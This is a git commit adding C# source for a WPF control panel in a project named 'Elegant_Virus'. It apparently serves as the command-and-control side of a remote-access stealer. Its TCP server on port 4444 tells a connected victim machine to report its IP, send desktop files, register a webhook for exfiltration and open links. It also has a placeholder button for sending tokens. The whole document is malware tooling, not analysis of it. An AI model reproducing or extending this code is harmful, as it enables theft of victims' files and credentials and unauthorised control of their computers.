9437b413720af4f12e9af0a835a7153956c0d16d
pc <pc@DESKTOP-Q6PF768>
2022-05-03 04:57:28 -0700

    Add project files.

---
+++ MainWindow.xaml.cs
@@ -0,0 +1,165 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Net;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows;
+using System.Windows.Controls;
+using System.Windows.Data;
+using System.Windows.Documents;
+using System.Windows.Input;
+using System.Windows.Media;
+using System.Windows.Media.Imaging;
+using System.Windows.Navigation;
+using System.Windows.Shapes;
+
+namespace Elegant_Virus
+{
+    /// <summary>
+    /// Interaction logic for MainWindow.xaml
+    /// </summary>
+    public partial class MainWindow : Window
+    {
+        public bool Connection { get; set; }
+        public string WebHock { get; set; }
+        public MainWindow()
+        {
+            InitializeComponent();
+        }
+
+        private void Window_Activated(object sender, EventArgs e)
+        {
+            try
+            {
+                MouseLeftButtonDown += delegate
+                {
+                    try
+                    {
+                        DragMove();
+
+                    }catch (Exception ex)
+                    {
+                    }
+                };
+            }
+            catch (Exception)
+            {}
+        }
+
+        private void btnExit_Click(object sender, RoutedEventArgs e)
+        {
+            Environment.Exit(0);
+        }
+
+        private void btnMax_Click(object sender, RoutedEventArgs e)
+        {
+            if(WindowState == WindowState.Maximized)
+            {
+                WindowState = WindowState.Normal;
+            }
+            else
+            {
+                WindowState=WindowState.Maximized;
+            }
+        }
+
+        private void btnMin_Click(object sender, RoutedEventArgs e)
+        {
+            WindowState = WindowState.Minimized;
+        }
+
+        private void btnSendFiles_Click(object sender, RoutedEventArgs e)
+        {
+            if(Connection)
+            {
+                var ip = IPAddress.Any;
+                server server = new server(ip, 4444, 2);//in send socket status = 2 : send desktop Files
+
+                server.sendrequst();
+
+            }
+            else
+            {
+                MessageBox.Show("No Connection!");
+            }
+        }
+
+        private async void btnCon_Click(object sender, RoutedEventArgs e)
+        {
+            if (WebHock == null)
+            {
+                MessageBox.Show("You Not Enter WebHock!,");
+            }
+            else
+            {
+
+
+
+
+                lblWait.Content = "Wait For Connection...";
+
+
+            await Task.Delay(TimeSpan.FromSeconds(2));
+
+            var ip = IPAddress.Any;
+
+
+
+
+
+            server server = new server(ip, 4444, 1);//in send socket status = 1 :CONNECTION WITH IP
+            server.sendrequst();
+
+
+
+
+
+
+
+            lableIP.Content = "IP : " + server.IP ;
+            Connection = server.Connected;
+            
+            if(Connection == true)
+            {
+                lblStatus.Content = "online";
+                lblWait.Content = "Connected!";
+               await Task.Delay(TimeSpan.FromSeconds(3));
+                lblWait.Visibility = Visibility.Hidden;
+
+            }
+            else
+            {
+                lblStatus.Content = "ofline";
+
+            }
+            }
+        }
+
+
+        private void btnSendToken_Click(object sender, RoutedEventArgs e)
+        {
+            
+        }
+
+        private async void btnWebhook_Click(object sender, RoutedEventArgs e)
+        {
+            var ip = IPAddress.Any;
+            server server = new server(ip, 4444, 3,txtWebhook.Text);//in send socket status = 3 : webhock
+
+
+            server.sendrequst();
+            WebHock = server.webhock;
+        }
+
+        private void btnOpenWeb_Click(object sender, RoutedEventArgs e)
+        {
+            var ip = IPAddress.Any;
+            server server = new server(ip, 4444, 4, txt.Text);//in send socket status = 4 : open link
+
+
+            server.sendrequst();
+            WebHock = server.webhock;
+        }
+    }
+}
---
+++ server.cs
@@ -0,0 +1,124 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows;
+
+namespace Elegant_Virus
+{
+    internal class server : MainWindow
+    {
+        public string IP { get; set; }
+        public bool Connected { get; set; }
+        public string webhock { get; set; }
+        IPAddress _ip;
+            int _port;
+            int _status;
+            string _msg;
+            public server(IPAddress ip, int port, int status, string msg = "test")
+            {
+                this._ip = ip;
+                this._port = port;
+                this._status = status;
+                _msg = msg;
+            }
+            public  void sendrequst()
+
+            {
+                TcpListener listener = new TcpListener(this._ip, this._port);
+                listener.Start();
+                while (true)
+                {
+                    Console.WriteLine("wait for connection ");
+                    TcpClient client = listener.AcceptTcpClient();
+                    Console.WriteLine($"connected!");
+                    var clientsream = client.GetStream();
+                    NetworkStream stream = clientsream;
+                    StreamReader sr = new StreamReader(clientsream);
+                    StreamWriter sw = new StreamWriter(clientsream);
+                    try
+                    {
+                        byte[] buffer = new byte[1024];
+                        stream.Read(buffer, 0, buffer.Length);
+                        int recv = 0;
+                        foreach (byte b in buffer)
+                        {
+                            if (b != 0)
+                            {
+                                recv++;
+                            }
+                        }
+                        string requst = Encoding.UTF8.GetString(buffer, 0, recv);
+                        var status = this._status;
+                    if (status == 1)
+                    {
+                        sw.WriteLine("1");
+                        sw.Flush();
+                        var a = sr.ReadLine();
+                        IP = a;
+
+                        Connected = true;
+
+
+                        listener.Stop();
+
+
+                        break;
+                    }
+                    else if (status == 2)
+                    {
+                        sw.WriteLine("2");
+                        sw.Flush();
+                        listener.Stop();
+
+                        break;
+
+                    }
+                    else if (status == 3)
+                    {
+                        webhock = this._msg;
+                        sw.WriteLine($"3`{webhock}");
+                        sw.Flush();
+
+                        var webhockrepo = sr.ReadLine();
+
+                        webhock = webhockrepo;
+                        listener.Stop();
+
+                        break;
+
+                    }
+                    else if (status == 4)
+                    {
+                        sw.WriteLine($"4`{this._msg}");
+                        sw.Flush();
+
+                        var webhockrepo = sr.ReadLine();
+
+                        listener.Stop();
+
+                        break;
+                    }
+                    else
+                    {
+                        listener.Stop();
+                        break;
+
+                    }
+
+
+                    }
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show(ex.Message);
+                    }
+                }
+            }
+
+        }
+    
+}
